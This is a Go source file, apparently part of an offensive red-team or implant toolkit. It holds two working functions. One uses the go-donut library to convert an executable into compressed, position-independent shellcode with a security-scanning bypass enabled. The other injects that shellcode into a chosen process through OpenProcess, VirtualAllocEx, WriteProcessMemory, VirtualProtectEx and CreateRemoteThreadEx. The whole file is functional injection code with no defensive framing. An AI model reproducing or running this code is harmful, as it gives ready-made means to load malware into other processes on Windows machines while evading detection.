package hg

import (
	"bytes"
	"errors"
	"unsafe"

	"github.com/Binject/go-donut/donut"
	"golang.org/x/sys/windows"
)

func GenerateShellCodeFromFile(path string) (*bytes.Buffer, error) {
	var arch donut.DonutArch
	switch GetCurrentProcArch() {
	case "amd64":
		arch = donut.X64
	case "i386":
		arch = donut.X32
	}

	config := new(donut.DonutConfig)
	config.Arch = arch
	config.Entropy = uint32(3)
	config.OEP = uint64(0)
	config.InstType = donut.DONUT_INSTANCE_PIC
	config.Parameters = ""
	config.Runtime = ""
	config.Method = ""
	config.Domain = ""
	config.Bypass = 3
	config.ModuleName = ""
	config.Compress = uint32(1)
	config.Verbose = false

	payload, err := donut.ShellcodeFromFile(path, config)
	if err != nil {
		return nil, err
	}

	return payload, nil
}

func CreateRemoteThread(shellcode []byte, pid int) error {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")

	GetCurrentProcess := kernel32.NewProc("GetCurrentProcess")
	OpenProcess := kernel32.NewProc("OpenProcess")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
	CloseHandle := kernel32.NewProc("CloseHandle")

	var pHandle uintptr

	if pid == 0 {
		pHandle, _, _ = GetCurrentProcess.Call()
	} else {
		pHandle, _, _ = OpenProcess.Call(
			windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
			uintptr(0),
			uintptr(pid),
		)
	}

	addr, _, _ := VirtualAllocEx.Call(
		uintptr(pHandle),
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)

	if addr == 0 {
		return errors.New("VirtualAllocEx failed and returned 0")
	}

	WriteProcessMemory.Call(
		uintptr(pHandle),
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)

	oldProtect := windows.PAGE_READWRITE
	VirtualProtectEx.Call(
		uintptr(pHandle),
		addr,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	CreateRemoteThreadEx.Call(
		uintptr(pHandle),
		0,
		0,
		addr,
		0,
		0,
		0,
	)

	_, _, errCloseHandle := CloseHandle.Call(pHandle)
	if errCloseHandle != nil {
		return errCloseHandle
	}

	return nil
}
